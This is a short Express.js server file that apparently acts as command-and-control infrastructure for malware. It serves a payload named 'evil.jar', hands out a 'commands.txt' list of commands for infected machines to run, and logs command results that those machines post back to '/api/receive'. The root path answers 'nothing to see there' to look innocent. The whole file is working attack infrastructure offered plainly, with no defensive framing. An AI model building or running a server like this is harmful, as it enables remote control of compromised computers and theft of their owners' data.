var express = require("express");
var app = express();

// serve our 'evil.jar'
app.use('/static', express.static('static'));
// serve list of commands
app.use('/commands.txt', express.static('static/commands.txt'));

var bodyParser = require("body-parser");
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

var HTTP_PORT = 8000

// Start server
app.listen(HTTP_PORT, () => {
    console.log("Server running on port %PORT%".replace("%PORT%",HTTP_PORT))
});

// this endpoint is used to accept results of executed commands
app.post("/api/receive", (req, res, next) => {  
    console.log('received data:',req.body.data);   
    res.json({
        "message":"ok",
            });
    
});
// Root path
app.get("/", (req, res, next) => {
    res.json({"message":"nothing to see there"})
});

